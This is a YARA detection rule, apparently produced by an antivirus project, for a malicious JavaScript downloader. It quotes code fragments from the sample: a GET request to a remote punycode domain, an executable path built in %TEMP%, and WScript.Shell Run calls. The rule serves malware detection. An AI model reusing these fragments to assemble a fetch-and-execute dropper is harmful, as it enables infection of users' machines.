rule sig_20160329_61eee57c54256a0b95d4f2401558c2bf {
  meta:
    description = "datamaliciousorder - file 20160329_61eee57c54256a0b95d4f2401558c2bf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "96a687ad96e25e20616ff22c45987ca41b556684b8b62856d3544dd4f9b73bea"

  strings:
    $s1  = "kT[k](\"GET\", \"http://xn--kandypriv-j4a.com/lo4sad\", false);" fullword ascii
    $s2  = "function dF() {return P[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"I3dCBIOG4QDr77.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[b](r() * 11); if (kT[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Wc(q, sE){ym = ym * 1; return q - sE;};" fullword ascii
    $s5  = "var P = function y() {return WScript[mx](\"WScript.Shell\");}(), Fv = 11;" fullword ascii
    $s6  = "function IB(){return \"\" + h;};" fullword ascii
    $s7  = "function kC(xD){P[\"Run\"](xD, ym, ym);};" fullword ascii
    $s8  = "function j() {return ((kP == true) && (kP == Z)) ? 1 : ym;};" fullword ascii
    $s9  = " while (x){" fullword ascii
    $s10 = "var id = new this[\"Date\"]();" fullword ascii
    $s11 = "function Y(WO) {var M = (1, 2, 3, 4, 5, WO); return M;};" fullword ascii
    $s12 = "function K()" fullword ascii
    $s13 = "function r(){return 22;};" fullword ascii
    $s14 = "return Wc(b0, zK);" fullword ascii
    $s15 = "function O(){return mx;};" fullword ascii
    $s16 = "Z = true; " fullword ascii
    $s17 = "var kP = false;" fullword ascii
    $s18 = "var Z = false;" fullword ascii
    $s19 = "kP = true; " fullword ascii
    $s20 = "} catch(F){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}